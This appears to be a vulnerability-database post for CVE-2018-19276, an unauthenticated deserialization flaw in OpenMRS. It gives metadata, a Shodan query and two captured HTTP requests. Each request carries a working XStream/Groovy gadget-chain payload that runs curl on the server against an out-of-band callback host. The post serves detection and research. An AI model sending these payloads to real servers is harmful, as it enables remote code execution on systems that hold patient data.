---
layout: "post"
cve_id: "CVE-2018-19276"
title: "OpenMRS Platform < 2.24.0 - Insecure Object Deserialization"
pcap: true
pcap_path: "/pcaps/2018/CVE-2018-19276.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2018/CVE-2018-19276.yaml"
author: "DhiyaneshDK"
severity: "critical"
reference:
  - "http://packetstormsecurity.com/files/155691/OpenMRS-Java-Deserialization-Remote-Code-Execution.html"
  - "https://know.bishopfox.com/advisories/news/2019/02/openmrs-insecure-object-deserialization"
  - "https://nvd.nist.gov/vuln/detail/CVE-2018-19276"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
  cvss-score: 9.8
  cve-id: "CVE-2018-19276"
  cwe-id: "CWE-502"
  epss-score: 0.93228
  epss-percentile: 0.99785
  cpe: "cpe:2.3:a:openmrs:openmrs:*:*:*:*:*:*:*:*"
metadata:
  verified: True
  max-request: 2
  vendor: "openmrs"
  product: "openmrs"
  shodan-query: "html:\"OpenMRS\""
tags:
  - "cve"
  - "cve20218"
  - "openmrs"
  - "deserialization"
  - "rce"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## ðŸ” Vulnerability Description
OpenMRS before 2.24.0 is affected by an Insecure Object Deserialization vulnerability that allows an unauthenticated user to execute arbitrary commands on the targeted system via crafted XML data in a request body.


## ðŸŒ HTTP Request
```nohighlight
POST /ws/rest/v1/xxxxxx HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/6.0
Content-Length: 952
Content-Type: text/xml
Accept-Encoding: gzip

<map>
  <entry>
    <groovy.util.Expando>
      <expandoProperties>
        <entry>
          <string>hashCode</string>
          <org.codehaus.groovy.runtime.MethodClosure>
            <delegate class="java.lang.ProcessBuilder">
              <command>
                <string>curl</string><string>d4tdopple0o4p57ci3sgjhm7fc1u9ikus.oast.online</string>
              </command>
              <redirectErrorStream>false</redirectErrorStream>
            </delegate>
            <owner class="java.lang.ProcessBuilder" reference="../delegate"/>
            <resolveStrategy>0</resolveStrategy>
            <directive>0</directive>
            <parameterTypes/>
            <maximumNumberOfParameters>0</maximumNumberOfParameters>
            <method>start</method>
          </org.codehaus.groovy.runtime.MethodClosure>
        </entry>
      </expandoProperties>
    </groovy.util.Expando>
    <int>1337</int>
  </entry>
</map>
```

```nohighlight
POST /openmrs/ws/rest/v1/xxxxxx HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Content-Length: 952
Content-Type: text/xml
Accept-Encoding: gzip

<map>
  <entry>
    <groovy.util.Expando>
      <expandoProperties>
        <entry>
          <string>hashCode</string>
          <org.codehaus.groovy.runtime.MethodClosure>
            <delegate class="java.lang.ProcessBuilder">
              <command>
                <string>curl</string><string>d4tdopple0o4p57ci3sgodt54aunk4q58.oast.online</string>
              </command>
              <redirectErrorStream>false</redirectErrorStream>
            </delegate>
            <owner class="java.lang.ProcessBuilder" reference="../delegate"/>
            <resolveStrategy>0</resolveStrategy>
            <directive>0</directive>
            <parameterTypes/>
            <maximumNumberOfParameters>0</maximumNumberOfParameters>
            <method>start</method>
          </org.codehaus.groovy.runtime.MethodClosure>
        </entry>
      </expandoProperties>
    </groovy.util.Expando>
    <int>1337</int>
  </entry>
</map>
```


